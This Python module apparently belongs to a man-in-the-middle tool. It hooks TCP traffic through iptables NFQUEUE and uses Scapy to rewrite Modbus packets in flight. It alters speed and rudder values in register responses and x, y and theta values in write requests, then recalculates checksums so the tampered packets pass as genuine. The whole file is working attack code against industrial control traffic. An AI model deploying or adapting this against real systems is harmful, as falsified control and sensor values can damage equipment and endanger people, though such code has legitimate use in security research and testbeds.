'''
NFQ module. Callbacks and persistent object
'''

from scapy.all import IP, TCP, Packet
from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
import threading, os, select
from netfilterqueue import NetfilterQueue as NFQ
from .. import modbus_util as mb
from ..mod_table import ModTable
from ..packet_buffer import PacketBuffer
from ..data_buffer import DataBuffer


class NetFilterQueue:

    def __init__(self, buffer: DataBuffer, mod_table: ModTable):
        self.stop_event = None
        self.thread = None
        self.callback = None
        self.buffer = buffer
        self.table = mod_table

    def is_running(self):
        return self.stop_event is not None or self.thread is not None or self.callback is not None


    def start(self): 
        if self.is_running():
            self.buffer.put("nfq", "status", "NFQ is already running")
            return
        self.callback = self.modify_and_accept
        self.stop_event = threading.Event()

        self.thread = threading.Thread(target=self._start, daemon=True)
        self.thread.start()


    def _start(self):

        # IPTables rule
        os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")

        # Create and bind NFQ callback
        nfq = NFQ()
        nfq.bind(1, self.callback)

        # Get readable file descriptor
        qfd = nfq.get_fd()
        poller = select.poll()
        poller.register(qfd, select.POLLIN)

        # Pipe for stop signaling
        stop_r, stop_w = os.pipe()
        poller.register(stop_r, select.POLLIN)
        self.buffer.put("nfq", "status", "Starting NFQ")
        try:
            while not self.stop_event.is_set():
                events = poller.poll(500)
                for fd, _ in events:
                    if fd == qfd:
                        nfq.run(False)   # process packets without blocking
                    elif fd == stop_r:
                        self.stop_event.set()
        # Stop on error or stop event
        finally:
            nfq.unbind()
            os.close(stop_r)
            os.close(stop_w)
            os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")


    def stop(self):
        if self.stop_event == None and self.thread == None:
            self.buffer.put("nfq", "status", "Net filter queue is not running")
            return
        else:
            self.buffer.put("nfq", "status", "Stopping net filter queue...")
            self.stop_event.set()
            self.thread.join()
            self.stop_event = None
            self.thread = None
            self.callback = None
            self.buffer.put("nfq", "status", "Stopped net filter queue")

    # Callbacks
    def accept_only(self, pkt: Packet):
        pkt.accept()

    def modify_and_accept(self, pkt: Packet):
        spkt = IP(pkt.get_payload())
        if spkt.haslayer("Read Holding Registers Response"):
            self.buffer.put("nfq", "Incoming Modbus Packet", spkt)
            mult = self.table.get_raw("speed", "mult")
            offset = self.table.get_raw("speed", "offset")

            mbl = spkt.getlayer(ModbusADUResponse)

            speed = mbl.payload.registerVal[0]
            val = int(speed * mult + offset)
            val = max(0, min(65535, val))
            mbl.payload.registerVal[0] = val

            if len(mbl.payload.registerVal) > 1:
                mult = self.table.get_raw("rudder", "mult")
                offset = self.table.get_raw("rudder", "offset")
                rudder = mbl.payload.registerVal[1]
                val = int(rudder * mult + offset)
                val = max(0, min(65535, val))
                mbl.payload.registerVal[1] = val

        elif spkt.haslayer("Write Single Register"):
            self.buffer.put("nfq", "Incoming Modbus Packet", spkt)

            mbl = spkt.getlayer(ModbusADURequest)

            if mbl.payload.registerAddr == 10: # X address
                var = "x"
            elif mbl.payload.registerAddr == 11: # Y address
                var = "y"
            else: # Theta address
                var = "theta"

            z = mbl.payload.registerValue
            mult = self.table.get_raw(var, "mult")
            offset = self.table.get_raw(var, "offset")
            val = int(z * mult + offset)
            val = max(0, min(65535, val))
            mbl.payload.registerValue = val

        else:
            pkt.accept()
            return

        # Recalculate checksums
        # del mbl.len
        del spkt[IP].len
        del spkt[TCP].chksum
        del spkt[IP].chksum

        spkt = IP(bytes(spkt))
        pkt.set_payload(bytes(spkt))
        pkt.accept()

        self.buffer.put("nfq", "Outgoing Modbus Packet", spkt)